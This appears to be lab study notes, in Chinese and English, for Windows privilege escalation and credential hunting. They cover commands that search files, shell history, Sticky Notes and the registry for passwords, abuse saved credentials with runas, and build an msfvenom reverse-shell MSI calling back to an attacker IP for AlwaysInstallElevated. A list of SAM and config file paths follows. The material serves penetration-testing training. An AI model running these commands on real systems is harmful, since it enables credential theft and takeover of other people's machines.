# Tips
该主机角色是不是备份？
```powershell
tree
tree /F #显示包含文件
tree /A #使用标准ASCII字符绘树状图
tree /?

dir /S C:\path\to\directory #递归浏览
Get-ChildItem -Path C:\path\to\directory -Recurse #gci ls ....
```
# Search
## Content of Secret --> findstr/select-string
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
# 在特定目录下使用(C:\inetpub, C:\xampp, ....etc  )
findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.* 

select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

# Chrome Dictionary.txt
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```
iis defaulte location: `C:\inetpub\wwwroot\web.config`
## Secret File Extension--> where / Gci
```powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
where /R C:\ *.config
reg query HKLM /f pass /t REG_SZ /s
```
## History/User file --> gci
主目录下文件还是需要手动查看
```powershell
# Search
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include Transcripts* -File -Recurse -ErrorAction SilentlyContinue -force
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore

Get-History
gc (Get-PSReadlineOption).HistorySavePath
#显示可访问的用户历史文件
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
# Sticky Notes
桌面应用：便签纸上的信息，存储在数据库文件中，可以使用SQLite访问
```powershell
ls  C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
```
Local Extract
```bash
#提取信息使用SQLITE
select Text from Note
strings plum.sqlite-wal
```
在powershell下打开sqlite文件:
[PSSQLite](https://github.com/RamblingCookieMonster/PSSQLite)
```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PSSQLite.psd1
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap    
```
# Saved Credentials
```powershell
dir env:
cmdkey /list

# powershell crediential object.
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# IIS -> connectionString
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
# PUTTY
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\
```
## Runas
```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE" #返回自己一个shell查看用户名
```
# Event Viewer
**Need RDP**
#### GUI
1. Win+R运行Eventvwr.msc打开事件查看器
2. 展开application & services logs --> MicroSoft --> Windows --> powershell --> Operational
#Tips Custom Views可以定制需要观察的logs（e.g. windows error..

# EasyWin - Reg Infomation - AlwaysInstallElevated / 
>Windows安装程序文件（也称为.msi文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。然而，可以配置它们以更高的权限级别从任何用户帐户（甚至是非特权用户）运行。这可能允许我们生成一个恶意的MSI文件，以管理员权限运行。

```powershell
# quickwin
%windir%\Panther\Unattended.xml # 无人值守安装 --> 凭证（plain/base64）
%windir%\Windows\Panther\Unattend.xml
%windir%\Windows\Panther\Unattend\Unattend.xml

C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # --> 1?
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer# --> 1?

msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
# Service files
```cmd
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
C:\inetpub
C:\xampp
```
# Sensitive files
敏感文件列表： https://github.com/carlospolop/Auto_Wordlists
```powershell
# User file
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat

# WEB
C:\inetpub\wwwroot\Web.config
C:/inetpub/wwwroot/global.asa

C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
%windir%\system32\logfiles\httperr\httperr1.log

C:/Program Files/FileZilla Server/FileZilla Server.xml

%windir%\iis6.log (5,6 or 7)
# System Backups/db/setting File
%windir%\system32\config\SAM (only really useful if you have access to the files while the machine is off)
%windir%\System32\config\RegBack\SAM
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%windir%\debug\NetSetup.log (AD domain name, DC name, internal IP, DA account)
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
## Config
%windir%\system32\config\AppEvent.Evt (Application log)
%windir%\system32\config\SecEvent.Evt (Security log)
%windir%\system32\config\default.sav
%windir%\system32\config\security.sav
%windir%\system32\config\software.sav
%windir%\system32\config\system.sav
# sys config --> never meet
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
# virtual memory --> temp file?
%SYSTEMDRIVE%\pagefile.sys
## Network -> Hosts --> nerver meet
%windir%\System32\drivers\etc\hosts (dns entries)
%windir%\System32\drivers\etc\networks (network settings)
%windir%\system32\inetsrv\config\applicationHost.config
%windir%\system32\inetsrv\config\schema\ASPNET_schema.xml

# Log file
## SCCM 集成控制,用于管理 Microsoft 应用程序 --> 所以能获得什么信息？
%WINDIR%\system32\CCM\logs\*.log
# log of joining the domain.
%WINDIR%\debug\NetSetup.log
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log

# sysprep file --> never meet
C:\sysprep.inf
C:\sysprep\sysprep.inf
C:\sysprep\sysprep.xml
%windir%\Windows\system32\sysprep.inf
%windir%\Windows\system32\sysprep\sysprep.xml

# Windows Rootdir File
C:/boot.ini

# mysql %MySQL% --> c:\MYSQL, C:\program ..\MYSQL, C:/Program Files/MySQL/MySQL Server 5.0/
%MySQL%/data/hostname.err
%MySQL%/data/mysql.err
%MySQL%/data/mysql.log
%MySQL%/data/hostname.err
%MySQL%/data/mysql-bin.log
%MySQL%/data/mysql.err
%MySQL%/data/mysql.log
%MySQL%/my.cnf
%MySQL%/my.ini
# php
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
# .ini
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
```
